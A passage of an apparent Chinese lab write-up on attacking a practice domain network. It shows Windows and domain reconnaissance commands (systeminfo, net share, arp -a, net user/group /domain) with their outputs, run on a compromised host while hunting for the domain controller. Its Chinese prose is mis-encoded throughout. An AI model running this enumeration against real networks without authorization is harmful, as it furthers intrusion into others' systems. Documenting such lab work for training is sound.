å‘½ä»¤æç¤ºç¬¦ï¼ˆcmdï¼‰ä¸­ä½¿ç”¨çš„å‘½ä»¤ï¼Œç”¨äºæ›´æ”¹æˆ–æ˜¾ç¤ºå½“å‰ä½¿ç”¨çš„ä»£ç é¡µã€‚ä»£ç é¡µå®šä¹‰äº†å­—ç¬¦åœ¨è®¡ç®—æœºä¸­å¦‚ä½•è¡¨ç¤ºï¼ŒåŒ…æ‹¬å­—ç¬¦çš„ç¼–ç å’Œè§£ç æ–¹å¼ã€‚</p><p>65001 æ˜¯ UTF-8 ç¼–ç çš„ä»£ç é¡µç¼–å·ã€‚UTF-8 æ˜¯ä¸€ç§å¹¿æ³›ä½¿ç”¨çš„å­—ç¬¦ç¼–ç ï¼Œå®ƒå¯ä»¥è¡¨ç¤ºä»»ä½• Unicode å­—ç¬¦ï¼Œå¹¶ä¸ ASCII ç¼–ç å…¼å®¹ã€‚åœ¨å‘½ä»¤æç¤ºç¬¦ä¸­è¿è¡Œ chcp 65001 å‘½ä»¤ä¼šå°†å½“å‰ä¼šè¯çš„ä»£ç é¡µæ›´æ”¹ä¸º UTF-8ã€‚è¿™é€šå¸¸ç”¨äºç¡®ä¿å‘½ä»¤è¡Œå¯ä»¥æ­£ç¡®å¤„ç†å’Œæ˜¾ç¤º Unicode å­—ç¬¦ï¼Œä¾‹å¦‚ä¸­æ–‡ã€æ—¥æ–‡ã€éŸ©æ–‡ç­‰éæ‹‰ä¸å­—ç¬¦ã€‚</p></blockquote><h4 id="2ï¼‰systeminfo"><a href="#2ï¼‰systeminfo" class="headerlink" title="2ï¼‰systeminfo"></a>2ï¼‰systeminfo</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>systeminfosysteminfoHost Name:                 PC1OS Name:                   Microsoft Windows <span class="token number">7</span> ä¸“ä¸šç‰ˆ OS Version:                <span class="token number">6.1</span>.7601 Service Pack <span class="token number">1</span> Build <span class="token number">7601</span>OS Manufacturer:           Microsoft CorporationOS Configuration:          Member WorkstationOS Build Type:             Multiprocessor FreeRegistered Owner:          Windows ç”¨æˆ·Registered Organization:   Product ID:                00371-177-0000061-85693Original Install Date:     <span class="token number">2019</span>/8/25, <span class="token number">9</span>:54:10System Boot Time:          <span class="token number">2024</span>/12/31, <span class="token number">17</span>:43:46System Manufacturer:       VMware, Inc.System Model:              VMware Virtual PlatformSystem Type:               x64-based PCProcessor<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:              <span class="token number">1</span> Processor<span class="token punctuation">(</span>s<span class="token punctuation">)</span> Installed.                           <span class="token punctuation">[</span>01<span class="token punctuation">]</span>: Intel64 Family <span class="token number">6</span> Model <span class="token number">158</span> Stepping <span class="token number">10</span> GenuineIntel ~2592 MhzBIOS Version:              Phoenix Technologies LTD <span class="token number">6.00</span>, <span class="token number">2020</span>/7/22Windows Directory:         C:<span class="token punctuation">\</span>WindowsSystem Directory:          C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system32Boot Device:               <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1System Locale:             zh-cn<span class="token punctuation">;</span>Chinese <span class="token punctuation">(</span>China<span class="token punctuation">)</span>Input Locale:              zh-cn<span class="token punctuation">;</span>Chinese <span class="token punctuation">(</span>China<span class="token punctuation">)</span>Time Zone:                 <span class="token punctuation">(</span>UTC+08:00<span class="token punctuation">)</span> Beijing, Chongqing, Hong Kong, UrumqiTotal Physical Memory:     <span class="token number">2,047</span> MBAvailable Physical Memory: <span class="token number">306</span> MBVirtual Memory: Max Size:  <span class="token number">4,095</span> MBVirtual Memory: Available: <span class="token number">1,565</span> MBVirtual Memory: In Use:    <span class="token number">2,530</span> MBPage File Location<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:     C:<span class="token punctuation">\</span>pagefile.sysDomain:                    whoamianony.orgLogon Server:              N/AHotfix<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:                 <span class="token number">4</span> Hotfix<span class="token punctuation">(</span>s<span class="token punctuation">)</span> Installed.                           <span class="token punctuation">[</span>01<span class="token punctuation">]</span>: KB2534111                           <span class="token punctuation">[</span>02<span class="token punctuation">]</span>: KB2999226                           <span class="token punctuation">[</span>03<span class="token punctuation">]</span>: KB958488                           <span class="token punctuation">[</span>04<span class="token punctuation">]</span>: KB976902Network Card<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:           <span class="token number">4</span> NIC<span class="token punctuation">(</span>s<span class="token punctuation">)</span> Installed.                           <span class="token punctuation">[</span>01<span class="token punctuation">]</span>: Intel<span class="token punctuation">(</span>R<span class="token punctuation">)</span> PRO/1000 MT Network Connection                                 Connection Name: æœ¬åœ°è¿æ¥                                 DHCP Enabled:    No                                 IP address<span class="token punctuation">(</span>es<span class="token punctuation">)</span>                                 <span class="token punctuation">[</span>01<span class="token punctuation">]</span>: <span class="token number">192.168</span>.52.30                                 <span class="token punctuation">[</span>02<span class="token punctuation">]</span>: fe80::481d:3bc4:e671:f945                                 <span class="token punctuation">[</span>03<span class="token punctuation">]</span>: fd15:4ba5:5a2b:1008:d5a6:4c1e:3d3b:8db0                                 <span class="token punctuation">[</span>04<span class="token punctuation">]</span>: fd15:4ba5:5a2b:1008:481d:3bc4:e671:f945                           <span class="token punctuation">[</span>02<span class="token punctuation">]</span>: Bluetooth è®¾å¤‡<span class="token punctuation">(</span>ä¸ªäººåŒºåŸŸç½‘<span class="token punctuation">)</span>                                 Connection Name: Bluetooth ç½‘ç»œè¿æ¥                                 Status:          Media disconnected                           <span class="token punctuation">[</span>03<span class="token punctuation">]</span>: Microsoft Loopback Adapter                                 Connection Name: Npcap Loopback Adapter                                 DHCP Enabled:    Yes                                 DHCP Server:     <span class="token number">255.255</span>.255.255                                 IP address<span class="token punctuation">(</span>es<span class="token punctuation">)</span>                                 <span class="token punctuation">[</span>01<span class="token punctuation">]</span>: <span class="token number">169.254</span>.129.186                                 <span class="token punctuation">[</span>02<span class="token punctuation">]</span>: fe80::b461:ccad:e30f:81ba                           <span class="token punctuation">[</span>04<span class="token punctuation">]</span>: Intel<span class="token punctuation">(</span>R<span class="token punctuation">)</span> PRO/1000 MT Network Connection                                 Connection Name: æœ¬åœ°è¿æ¥ <span class="token number">4</span>                                 DHCP Enabled:    No                                 IP address<span class="token punctuation">(</span>es<span class="token punctuation">)</span>                                 <span class="token punctuation">[</span>01<span class="token punctuation">]</span>: <span class="token number">192.168</span>.93.20                                 <span class="token punctuation">[</span>02<span class="token punctuation">]</span>: fe80::4470:563b:f7c2:3f8a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ‰å‡ æ¡éœ€è¦ç‰¹åˆ«å…³æ³¨çš„ä¿¡æ¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">åŸŸï¼š whoamianony.orgè¡¥ä¸ï¼š <span class="token punctuation">[</span>01<span class="token punctuation">]</span>: KB2534111 <span class="token punctuation">[</span>02<span class="token punctuation">]</span>: KB2999226  <span class="token punctuation">[</span>03<span class="token punctuation">]</span>: KB958488 <span class="token punctuation">[</span>04<span class="token punctuation">]</span>: KB976902IPï¼š192.168.52.30 ã€192.168.93.20      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä»ä¹‹å‰çš„DMZå’ŒäºŒå±‚ç½‘ç»œæ¸—é€çš„è¿‡ç¨‹æ¥çœ‹ï¼Œ192.168.52.0/24è¿™ä¸ªç½‘æ®µæ˜¯äºŒå±‚ç½‘ç»œçš„ç½‘æ®µï¼Œ92.168.93.0/24è¿™ä¸ªç½‘æ®µå› è¯¥å°±æ˜¯ä¸‰å±‚ç½‘ç»œçš„ç½‘æ®µäº†ã€‚ipconfigæ‰§è¡Œç»“æœä¹Ÿç±»ä¼¼ï¼š</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.57.45.png" style="zoom:40%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2014.58.24.png" style="zoom:50%;"><h4 id="3ï¼‰ipconfig-all"><a href="#3ï¼‰ipconfig-all" class="headerlink" title="3ï¼‰ipconfig /all"></a>3ï¼‰ipconfig /all</h4><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2015.00.11.png" style="zoom:40%;"><p>å¯ä»¥çœ‹å‡ºåŸŸç¯å¢ƒä¸ºwhoamianony.org</p><h4 id="4ï¼‰route-print-è·¯ç”±ä¿¡æ¯"><a href="#4ï¼‰route-print-è·¯ç”±ä¿¡æ¯" class="headerlink" title="4ï¼‰route print è·¯ç”±ä¿¡æ¯"></a>4ï¼‰route print è·¯ç”±ä¿¡æ¯</h4><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2015.04.55.png" style="zoom:30%;"><h4 id="5ï¼‰net-startæŸ¥çœ‹å¼€å¯äº†å“ªäº›æœåŠ¡"><a href="#5ï¼‰net-startæŸ¥çœ‹å¼€å¯äº†å“ªäº›æœåŠ¡" class="headerlink" title="5ï¼‰net startæŸ¥çœ‹å¼€å¯äº†å“ªäº›æœåŠ¡"></a>5ï¼‰net startæŸ¥çœ‹å¼€å¯äº†å“ªäº›æœåŠ¡</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net startnet startThese Windows services are started:   Application Experience   Application Information   Base Filtering Engine   Bluetooth Support Service   COM+ Event System   Computer Browser   Cryptographic Services   DCOM Server Process Launcher   Desktop Window Manager Session Manager   DHCP Client   Diagnostic Policy Service   Diagnostic Service Host   Diagnostic System Host   Distributed Link Tracking Client   Distributed Transaction Coordinator   DNS Client   Group Policy Client   IKE and AuthIP IPsec Keying Modules   IP Helper   IPsec Policy Agent   MySQL5_OA   Netlogon   Network Connections   Network List Service   Network Location Awareness   Network Store Interface Service   Office_Daemon   Office_DbProxy   Office_IM   Office_Index   Office_Mail   Office_MQ   Office_POP3   Office_Redis   Office_Task   Office_Web   Offline Files   Plug and Play   Power   Print Spooler   Program Compatibility Assistant Service   Remote Procedure Call <span class="token punctuation">(</span>RPC<span class="token punctuation">)</span>   RPC Endpoint Mapper   Security Accounts Manager   Security Center   Server   Shell Hardware Detection   Software Protection   SPP Notification Service   System Event Notification Service   Task Scheduler   TCP/IP NetBIOS Helper   Themes   TP AutoConnect Service   User Profile Service   VMware Alias Manager and Ticket Service   VMware Tools   VMware ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½   Windows Audio   Windows Audio Endpoint Builder   Windows Defender   Windows Event Log   Windows Firewall   Windows Font Cache Service   Windows Management Instrumentation   Windows Search   Windows Time   Windows Update   WorkstationThe <span class="token builtin class-name">command</span> completed successfully.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="6ï¼‰net-share-æŸ¥çœ‹å¼€å¯äº†å“ªäº›å…±äº«"><a href="#6ï¼‰net-share-æŸ¥çœ‹å¼€å¯äº†å“ªäº›å…±äº«" class="headerlink" title="6ï¼‰net share æŸ¥çœ‹å¼€å¯äº†å“ªäº›å…±äº«"></a>6ï¼‰net share æŸ¥çœ‹å¼€å¯äº†å“ªäº›å…±äº«</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net sharenet shareShare name   Resource                        Remark-------------------------------------------------------------------------------C$           C:<span class="token punctuation">\</span>                             Ä¬ï¿½Ï¹ï¿½ï¿½ï¿½                              IPC$                                         Ô¶ï¿½ï¿½ IPC                            ADMIN$       C:<span class="token punctuation">\</span>Windows                      Ô¶ï¿½ï¿½ï¿½ï¿½                              The <span class="token builtin class-name">command</span> completed successfully.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>åœ¨ Windows ç³»ç»Ÿä¸­ï¼Œ<code>net share</code> å‘½ä»¤ç”¨äºæ˜¾ç¤ºæˆ–ç®¡ç†ç½‘ç»œå…±äº«èµ„æºã€‚ä»æ‚¨æä¾›çš„å‘½ä»¤è¾“å‡ºæ¥çœ‹ï¼Œåˆ—å‡ºäº†å‡ ä¸ªé»˜è®¤çš„ Windows å…±äº«ï¼š</p><ol><li><strong>C$</strong> - è¿™æ˜¯ C ç›˜çš„é»˜è®¤å…±äº«ï¼Œå…è®¸ç®¡ç†å‘˜åœ¨ç½‘ç»œä¸Šè®¿é—® C ç›˜æ ¹ç›®å½•ã€‚åœ¨å‘½ä»¤è¾“å‡ºä¸­æ˜¾ç¤ºä¸ºä¹±ç ï¼Œè¿™å¯èƒ½æ˜¯ç”±äºå‘½ä»¤è¡Œç•Œé¢çš„å­—ç¬¦ç¼–ç è®¾ç½®ä¸æ­£ç¡®å¯¼è‡´çš„ã€‚</li><li><strong>IPC$</strong> - è¿™æ˜¯ Windows çš„å‘½åç®¡é“å…±äº«ï¼Œç”¨äºè¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰ã€‚å®ƒä¸å¯¹åº”äºæ–‡ä»¶ç³»ç»Ÿä¸­çš„å®é™…è·¯å¾„ï¼Œè€Œæ˜¯ç”¨äºè¿œç¨‹ç®¡ç†æœåŠ¡ã€‚</li><li><strong>ADMIN$</strong> - è¿™æ˜¯ Windows ç³»ç»Ÿä¸­çš„é»˜è®¤ç®¡ç†å…±äº«ï¼Œé€šå¸¸æŒ‡å‘ Windows ç›®å½•ï¼ˆC:\Windowsï¼‰ï¼Œç”¨äºè¿œç¨‹ç®¡ç†ã€‚</li></ol></blockquote><h4 id="7ï¼‰net-user-æŸ¥çœ‹æœ¬æœºç”¨æˆ·"><a href="#7ï¼‰net-user-æŸ¥çœ‹æœ¬æœºç”¨æˆ·" class="headerlink" title="7ï¼‰net user æŸ¥çœ‹æœ¬æœºç”¨æˆ·"></a>7ï¼‰net user æŸ¥çœ‹æœ¬æœºç”¨æˆ·</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net usernet userUser accounts <span class="token keyword">for</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>-------------------------------------------------------------------------------Administrator            Guest                    The <span class="token builtin class-name">command</span> completed with one or <span class="token function">more</span> errors.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°Administrator å’Œ Guest ç”¨æˆ·ã€‚</p><h3 id="8-5-3-åŸŸå†…ä¿¡æ¯æ”¶é›†"><a href="#8-5-3-åŸŸå†…ä¿¡æ¯æ”¶é›†" class="headerlink" title="8.5.3 åŸŸå†…ä¿¡æ¯æ”¶é›†"></a>8.5.3 åŸŸå†…ä¿¡æ¯æ”¶é›†</h3><h4 id="1ï¼‰åŸŸå†…å…¶ä»–ä¸»æœºå"><a href="#1ï¼‰åŸŸå†…å…¶ä»–ä¸»æœºå" class="headerlink" title="1ï¼‰åŸŸå†…å…¶ä»–ä¸»æœºå"></a>1ï¼‰åŸŸå†…å…¶ä»–ä¸»æœºå</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net view<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2015.07.26.png" style="zoom:40%;"><p>å¯ä»¥çœ‹åˆ°åŸŸå†…è¿˜æœ‰ä¸€å°åŸŸæ§ã€‚</p><h4 id="2ï¼‰æŸ¥çœ‹arpç¼“å­˜"><a href="#2ï¼‰æŸ¥çœ‹arpç¼“å­˜" class="headerlink" title="2ï¼‰æŸ¥çœ‹arpç¼“å­˜"></a>2ï¼‰æŸ¥çœ‹arpç¼“å­˜</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>arp <span class="token parameter variable">-a</span>arp <span class="token parameter variable">-a</span>Interface: <span class="token number">192.168</span>.52.30 --- 0xb  Internet Address      Physical Address      Type  <span class="token number">192.168</span>.52.1          fa-ff-c2-c2-93-66     dynamic     <span class="token number">192.168</span>.52.10         00-0c-29-b3-0c-c2     dynamic     <span class="token number">192.168</span>.52.20         00-0c-29-cd-28-24     dynamic     <span class="token number">192.168</span>.52.255        ff-ff-ff-ff-ff-ff     static      <span class="token number">224.0</span>.0.22            01-00-5e-00-00-16     static      <span class="token number">224.0</span>.0.252           01-00-5e-00-00-fc     static    Interface: <span class="token number">169.254</span>.129.186 --- 0x16  Internet Address      Physical Address      Type  <span class="token number">169.254</span>.255.255       ff-ff-ff-ff-ff-ff     static      <span class="token number">224.0</span>.0.22            01-00-5e-00-00-16     static      <span class="token number">224.0</span>.0.252           01-00-5e-00-00-fc     static      <span class="token number">255.255</span>.255.255       ff-ff-ff-ff-ff-ff     static    Interface: <span class="token number">192.168</span>.93.20 --- 0x17  Internet Address      Physical Address      Type  <span class="token number">192.168</span>.93.1          fa-ff-c2-c2-93-65     dynamic     <span class="token number">192.168</span>.93.10         00-0c-29-cd-28-2e     dynamic     <span class="token number">192.168</span>.93.30         00-0c-29-9f-f6-36     dynamic     <span class="token number">192.168</span>.93.40         00-0c-29-aa-22-ae     dynamic     <span class="token number">192.168</span>.93.255        ff-ff-ff-ff-ff-ff     static      <span class="token number">224.0</span>.0.22            01-00-5e-00-00-16     static      <span class="token number">224.0</span>.0.252           01-00-5e-00-00-fc     static    c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°é™¤äº†æœ¬æœº93.20å¤–è¿˜æœ‰93.30å’Œ93.40çš„ä¸»æœºï¼Œå¯èƒ½ä¸¤è€…ä¹‹ä¸­çš„æŸä¸€ä¸ªå°±æ˜¯åŸŸæ§ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„ç»ˆæç›®æ ‡ã€‚</p><h4 id="3ï¼‰net-config-workstation"><a href="#3ï¼‰net-config-workstation" class="headerlink" title="3ï¼‰net config workstation"></a>3ï¼‰net config workstation</h4><p>æŸ¥çœ‹è®¡ç®—æœºåã€å…¨åã€ç”¨æˆ·åã€ç³»ç»Ÿç‰ˆæœ¬ã€å·¥ä½œç«™ã€åŸŸã€ç™»å½•åŸŸ</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-17%2015.20.53.png" style="zoom:50%;"><p>æ²¡æœ‰æŸ¥è¯¢åˆ°å¯ç”¨ä¿¡æ¯ã€‚</p><h4 id="4ï¼‰net-user-domain-æŸ¥çœ‹åŸŸç”¨æˆ·"><a href="#4ï¼‰net-user-domain-æŸ¥çœ‹åŸŸç”¨æˆ·" class="headerlink" title="4ï¼‰net user /domain æŸ¥çœ‹åŸŸç”¨æˆ·"></a>4ï¼‰net user /domain æŸ¥çœ‹åŸŸç”¨æˆ·</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net user /domainnet user /domainThe request will be processed at a domain controller <span class="token keyword">for</span> domain whoamianony.org.System error <span class="token number">5</span> has occurred.Access is denied.c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è®¿é—®è¢«æ‹’ç»äº†ã€‚</p><h4 id="5ï¼‰net-localgroup-administrators-æŸ¥çœ‹æœ¬åœ°ç®¡ç†å‘˜ç»„ï¼ˆé€šå¸¸ä¼šæœ‰åŸŸç”¨æˆ·ï¼‰"><a href="#5ï¼‰net-localgroup-administrators-æŸ¥çœ‹æœ¬åœ°ç®¡ç†å‘˜ç»„ï¼ˆé€šå¸¸ä¼šæœ‰åŸŸç”¨æˆ·ï¼‰" class="headerlink" title="5ï¼‰net localgroup administrators   æŸ¥çœ‹æœ¬åœ°ç®¡ç†å‘˜ç»„ï¼ˆé€šå¸¸ä¼šæœ‰åŸŸç”¨æˆ·ï¼‰"></a>5ï¼‰net localgroup administrators   æŸ¥çœ‹æœ¬åœ°ç®¡ç†å‘˜ç»„ï¼ˆé€šå¸¸ä¼šæœ‰åŸŸç”¨æˆ·ï¼‰</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net localgroup administratorsnet localgroup administratorsAlias name     administratorsComment        ï¿½ï¿½ï¿½ï¿½Ô±ï¿½Ô¼ï¿½ï¿½ï¿½ï¿½ï¿½/ï¿½ï¿½ï¿½Ğ²ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Æµï¿½ï¿½ï¿½È«ï¿½ï¿½ï¿½ï¿½È¨Members-------------------------------------------------------------------------------AdministratorThe <span class="token builtin class-name">command</span> completed successfully.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Administratorå¤§æ¦‚ç‡å°±æ˜¯åŸŸç®¡ç†å‘˜ç”¨æˆ·äº†ã€‚</p><h4 id="6ï¼‰net-view-domain-æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸ"><a href="#6ï¼‰net-view-domain-æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸ" class="headerlink" title="6ï¼‰net view /domain   æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸ"></a>6ï¼‰net view /domain   æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸ</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net view /domainnet view /domainDomain-------------------------------------------------------------------------------WHOAMIANONY          The <span class="token builtin class-name">command</span> completed successfully.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åªæœ‰ä¸€ä¸ªåŸŸã€‚</p><h4 id="7ï¼‰net-user-ç”¨æˆ·å-domain-è·å–æŒ‡å®šåŸŸç”¨æˆ·çš„ä¿¡æ¯"><a href="#7ï¼‰net-user-ç”¨æˆ·å-domain-è·å–æŒ‡å®šåŸŸç”¨æˆ·çš„ä¿¡æ¯" class="headerlink" title="7ï¼‰net user ç”¨æˆ·å /domain   è·å–æŒ‡å®šåŸŸç”¨æˆ·çš„ä¿¡æ¯"></a>7ï¼‰net user ç”¨æˆ·å /domain   è·å–æŒ‡å®šåŸŸç”¨æˆ·çš„ä¿¡æ¯</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net user Administrator /domainnet user Administrator /domainThe request will be processed at a domain controller <span class="token keyword">for</span> domain whoamianony.org.System error <span class="token number">5</span> has occurred.Access is denied.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è·å–å¤±è´¥ã€‚</p><h4 id="8ï¼‰net-group-domain"><a href="#8ï¼‰net-group-domain" class="headerlink" title="8ï¼‰net group /domain"></a>8ï¼‰net group /domain</h4><p>æŸ¥çœ‹åŸŸé‡Œé¢çš„å·¥ä½œç»„ï¼ŒæŸ¥çœ‹æŠŠç”¨æˆ·åˆ†äº†å¤šå°‘ç»„ï¼ˆåªèƒ½åœ¨åŸŸæ§ä¸Šæ“ä½œï¼‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net group /domainnet group /domainThe request will be processed at a domain controller <span class="token keyword">for</span> domain whoamianony.org.System error <span class="token number">5</span> has occurred.Access is denied.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŠ¥äº†ç›¸åŒçš„é”™è¯¯ï¼ŒæŠ¥è¿™äº›é”™è¯¯çš„å‘½ä»¤åº”è¯¥åªèƒ½åœ¨DCä¸Šæ‰§è¡Œã€‚</p><h4 id="9ï¼‰net-group-ç»„å-domain-æŸ¥çœ‹åŸŸä¸­æŸå·¥ä½œç»„"><a href="#9ï¼‰net-group-ç»„å-domain-æŸ¥çœ‹åŸŸä¸­æŸå·¥ä½œç»„" class="headerlink" title="9ï¼‰net group ç»„å /domain    æŸ¥çœ‹åŸŸä¸­æŸå·¥ä½œç»„"></a>9ï¼‰net group ç»„å /domain    æŸ¥çœ‹åŸŸä¸­æŸå·¥ä½œç»„</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net group Administrators /domainnet group Administrators /domainThe request will be processed at a domain controller <span class="token keyword">for</span> domain whoamianony.org.System error <span class="token number">5</span> has occurred.Access is denied.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="10ï¼‰net-group-â€œdomain-adminsâ€-domain-æŸ¥çœ‹åŸŸç®¡ç†å‘˜çš„åå­—"><a href="#10ï¼‰net-group-â€œdomain-adminsâ€-domain-æŸ¥çœ‹åŸŸç®¡ç†å‘˜çš„åå­—" class="headerlink" title="10ï¼‰net group â€œdomain adminsâ€ /domain   æŸ¥çœ‹åŸŸç®¡ç†å‘˜çš„åå­—"></a>10ï¼‰net group â€œdomain adminsâ€ /domain   æŸ¥çœ‹åŸŸç®¡ç†å‘˜çš„åå­—</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net group <span class="token string">"domain admins"</span> /domain net group <span class="token string">"domain admins"</span> /domain The request will be processed at a domain controller <span class="token keyword">for</span> domain whoamianony.org.System error <span class="token number">5</span> has occurred.Access is denied.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="11-net-group-â€œdomain-computersâ€-domain-æŸ¥çœ‹åŸŸä¸­çš„å…¶ä»–ä¸»æœºå"><a href="#11-net-group-â€œdomain-computersâ€-domain-æŸ¥çœ‹åŸŸä¸­çš„å…¶ä»–ä¸»æœºå" class="headerlink" title="11) net group â€œdomain computersâ€ /domain  æŸ¥çœ‹åŸŸä¸­çš„å…¶ä»–ä¸»æœºå"></a>11) net group â€œdomain computersâ€ /domain  æŸ¥çœ‹åŸŸä¸­çš„å…¶ä»–ä¸»æœºå</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">c:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System3<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>net group <span class="token string">"domain computers"</span> 